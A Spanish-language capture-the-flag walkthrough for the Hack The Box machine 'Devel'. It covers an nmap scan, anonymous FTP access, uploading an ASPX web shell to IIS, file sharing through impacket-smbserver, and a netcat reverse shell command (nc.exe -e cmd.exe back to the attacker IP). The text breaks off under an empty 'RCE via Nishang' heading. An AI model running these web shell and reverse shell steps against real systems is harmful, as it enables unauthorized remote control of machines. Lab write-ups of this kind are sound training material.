# Devel

## NMAP 

```
batcat -l ruby Scan
nmap -sCV -Pn -O -A -p21,80 -oN Scan 10.129.7.194
```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/f4235216-32cf-4ccd-a556-c1ed94f370aa)


## ftp 

Necesitamos conectarnos al ftp y primero con sesiones nulas

```
ftp 10.129.8.38
user:anonymous
pass:anonymous
help
ls -la
```

Enumerando un poco

```
whatweb http://10.129.8.38
curl -I -s http://10.129.8.38
curl -I -s -X GET http://10.129.8.38

```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/dddc2d45-6951-499e-bde9-663b85777836)

Esto quiere decir que puede interpretar .aspx

## RCE

Nos damos cuenta que el ftp esta conectad con el iispor lo que vamos a hacer es subir una shell Kali tienen varias...

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/6f85e96d-132a-4358-9bd1-d686098fad64)


```
sudo updatedb
locate *aspx* 
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/da9afa8e-abba-48ec-9a7f-c1b450bd775a)

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/18167bd9-6a6c-4f08-b6e7-2502b237183b)

### Compartir archivos a windows

Podemos montar una carpeta compartida en Kali y acceder desde Windows para esto se va a usar impacket-smbserver:

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/0241faf2-95a9-4db7-97a2-dbcef62954e1)


```
impacket-smbserver smbFolder $(pwd)

```

Desde Windows ya sea un cmd o un ps puedes usar 

```
copy \\10.10.14.90\smbFolder\archivo

```

## RCE via nc

En kali seclist tiene nc.exe


```
\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443

```

### RCE via Nishang




















































































































































